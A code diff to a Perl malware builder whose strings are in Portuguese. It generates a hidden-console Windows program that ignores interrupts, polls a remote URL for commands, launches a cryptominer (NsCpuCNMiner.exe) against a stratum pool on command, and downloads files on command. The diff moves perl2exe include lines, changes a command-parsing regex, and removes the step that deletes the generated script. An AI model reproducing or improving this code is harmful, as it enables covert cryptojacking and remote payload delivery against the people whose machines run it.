@@ -81,18 +81,17 @@ sub generate{
   open(OUTPUT, ">", "output.pl");
   print OUTPUT <<EXE;
 #!/usr/bin/perl -w
+#perl2exe_include Win32::HideConsole
+#perl2exe_include LWP::UserAgent
+#perl2exe_include LWP::Simple
+#perl2exe_include Config
+#perl2exe_include Cwd
 
 BEGIN {
   use Win32::HideConsole qw[hide_console];
   \$SIG{INT} = 'IGNORE';
   hide_console;
 }
-
-#perl2exe_include Win32::HideConsole
-#perl2exe_include LWP::UserAgent
-#perl2exe_include LWP::Simple
-#perl2exe_include Config
-#perl2exe_include Cwd
 
 use LWP::UserAgent qw[get agent decoded_content];
 use LWP::Simple qw[getstore];
@@ -120,7 +119,7 @@ while(1){
     }
   }
   \$response = \$ua->get(\"$_[0]\");
-  if(\$response->decoded_content =~ m/miner->host:(\\w);email:(\\w);/){
+  if(\$response->decoded_content =~ m/miner->host:(\\w),email:(\\w);/){
     system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
   }
   if(\$response->decoded_content =~ m/download:(\\w),(\\w);/){
@@ -164,5 +163,4 @@ EXE
     print "\n[", color("YELLOW"),"!",color("reset"), "] Somente as versoes 5.24.1 e 5.24.0 sao suportadas !\n";
   }
   sleep 3;
-  unlink "output.pl";
 }
